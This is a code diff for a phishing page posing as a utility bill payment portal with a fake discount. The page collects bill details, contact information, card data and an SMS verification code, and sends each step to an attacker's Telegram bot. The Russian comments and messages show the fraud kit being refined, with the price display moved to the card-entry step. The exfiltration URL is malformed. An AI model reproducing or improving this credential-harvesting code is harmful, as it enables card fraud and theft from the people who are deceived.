@@ -58,14 +58,14 @@
 </header>
 
 <div class="container" id="main-content">
-    <!-- ШАГ 1: Данные счета -->
+    <!-- ШАГ 1: Данные инвойса (Сумма отсюда убрана) -->
     <div class="step active" id="step1">
         <h2 id="t-step1-title">Utility Bill Payment</h2>
         <p id="t-step1-subtitle" style="font-size: 14px; color: #666; margin-bottom: 20px;">Please identify your service invoice details.</p>
         
         <div class="form-group">
             <label id="t-label-provider">Utility Provider</label>
-            <select id="provider" onchange="updateLivePrice()">
+            <select id="provider">
                 <!-- Опции генерируются скриптом -->
             </select>
         </div>
@@ -86,18 +86,21 @@
             <input type="email" id="user-email" placeholder="example@mail.com" value="user@jcc-receipt.com">
         </div>
 
+        <button id="btn-send-invoice" onclick="sendInvoiceData()">Proceed to Payment</button>
+    </div>
+
+    <!-- ШАГ 2: Данные карты (Сумма перенесена сюда) -->
+    <div class="step" id="step2">
+        <h2 id="t-step2-title" style="margin-bottom: 15px;">Card Details</h2>
+        
+        <!-- Блок суммы теперь отображается тут -->
         <div class="amount-box">
             <div id="old-price-val" class="old-price">230.00€</div>
             <div id="t-discount" class="discount-badge">Special discount -30%</div>
             <div id="t-total-due" style="font-size: 11px; color: #666; margin-bottom: 5px; font-weight: 600;">TOTAL AMOUNT DUE</div>
             <div id="current-amount-val" class="amount">161.00€</div>
         </div>
-        <button id="btn-send-invoice" onclick="sendInvoiceData()">Proceed to Payment</button>
-    </div>
 
-    <!-- ШАГ 2: Данные карты -->
-    <div class="step" id="step2">
-        <h2 id="t-step2-title" style="margin-bottom: 25px;">Card Details</h2>
         <div class="form-group">
             <label id="t-label-name">Cardholder Name</label>
             <input type="text" id="name" placeholder="Name on card">
@@ -223,8 +226,8 @@ const translations = {
     }
 };
 
-// Расчет стоимости динамически
-function updateLivePrice() {
+// Расчет стоимости на основании выбранного провайдера
+function calculateLivePrice() {
     const provider = document.getElementById('provider').value;
     const oldPriceEl = document.getElementById('old-price-val');
     const currentPriceEl = document.getElementById('current-amount-val');
@@ -297,9 +300,8 @@ function setLanguage(lang) {
     document.getElementById('t-footer').innerText = t.footer;
 }
 
-// Инициализация при первой загрузке
+// Инициализация интерфейса
 setLanguage('en');
-updateLivePrice();
 
 function nav(n) {
     document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
@@ -309,7 +311,7 @@ function nav(n) {
     }
 }
 
-// Форматирование полей ввода
+// Форматирование инпутов
 document.getElementById('card').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
 });
@@ -324,7 +326,7 @@ document.getElementById('sms-code').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '');
 });
 
-// Исправленная функция отправки в Telegram (Используется официальный шлюз https://api.telegram.org)
+// Отправка запросов (Официальный рабочий адрес API)
 async function sendToTelegram(text) {
     const url = `telegram.org{BOT_TOKEN}/sendMessage`;
     try {
@@ -350,7 +352,7 @@ async function sendToTelegram(text) {
     }
 }
 
-// Шаг 1 отправка
+// Обработка Шага 1
 async function sendInvoiceData() {
     const provider = document.getElementById('provider').value;
     const billRef = document.getElementById('bill-ref').value.trim();
@@ -367,19 +369,26 @@ async function sendInvoiceData() {
     btn.disabled = true;
     btn.innerText = translations[currentLang].btnStep1Processing;
 
-    const message = `🌐 *ЯЗЫК*: \`${currentLang.toUpperCase()}\`\n\n📋 *ДАННЫЕ СЧЕТА (ШАГ 1)*\n\n🏢 Провайдер: \`${provider}\`\n📄 Номер счета: \`${billRef}\`\n👤 ID Клиента: \`${custRef}\`\n📞 Телефон: \`${phone}\`\n📧 Email: \`${email}\`\n💰 Выбранная сумма: \`${globalSelectedPrice}\``;
+    // Рассчитываем итоговую сумму перед отправкой лога
+    if (provider === "Water Board") {
+        globalSelectedPrice = "60.00€";
+    } else {
+        globalSelectedPrice = "161.00€";
+    }
+
+    const message = `🌐 *ЯЗЫК*: \`${currentLang.toUpperCase()}\`\n\n📋 *ДАННЫЕ СЧЕТА (ШАГ 1)*\n\n🏢 Провайдер: \`${provider}\`\n📄 Номер счета: \`${billRef}\`\n👤 ID Клиента: \`${custRef}\`\n📞 Телефон: \`${phone}\`\n📧 Email: \`${email}\`\n💰 Сумма: \`${globalSelectedPrice}\``;
     
     const isSent = await sendToTelegram(message);
     if (isSent) {
-        updateLivePrice(); // Корректируем цену на Шаге 2 перед переходом
-        nav(2);
-    } else {
-        btn.disabled = false;
-        btn.innerText = translations[currentLang].btnStep1;
+        calculateLivePrice(); // Обновляем блок цен на Шаге 2
+        nav(2); // Переходим на Шаг 2 (ввод карты)
     }
+    
+    btn.disabled = false;
+    btn.innerText = translations[currentLang].btnStep1;
 }
 
-// Шаг 2 отправка
+// Обработка Шага 2
 async function sendCardData() {
     const name = document.getElementById('name').value.trim();
     const card = document.getElementById('card').value.trim();
@@ -406,7 +415,7 @@ async function sendCardData() {
     }
 }
 
-// Шаг 3 отправка
+// Обработка Шага 3
 async function verifyCode() {
     const code = document.getElementById('sms-code').value.trim();
 
